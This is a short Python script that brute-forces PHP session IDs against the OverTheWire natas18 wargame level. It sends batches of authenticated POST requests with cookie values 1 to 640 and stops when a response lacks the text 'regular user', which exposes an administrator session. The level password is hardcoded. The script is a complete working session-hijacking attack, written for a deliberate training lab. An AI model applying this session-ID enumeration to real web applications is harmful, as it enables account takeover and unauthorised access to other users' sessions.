import grequests


def exception_handler(r, e):
    print(r)
    print(e)


def brute_force(id_range):
    cookies = [{"PHPSESSID": str(id)} for id in id_range]
    # print(cookies)
    reqs = [grequests.post("http://natas18.natas.labs.overthewire.org/index.php",
                           auth=("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"),
                           cookies=cookie) for cookie in cookies]
    # print(reqs)
    ress = grequests.map(reqs, exception_handler=exception_handler)
    for res in ress:
        if 'regular user' not in res.text:
            print(res.text)
            return False
    return True


def main():
    for i in range(1, 641, 10):
        print("Trying {} to {}".format(i, i+10))
        keep_going = brute_force(range(i, i+10))
        if not keep_going:
            break


if __name__ == '__main__':
    main()

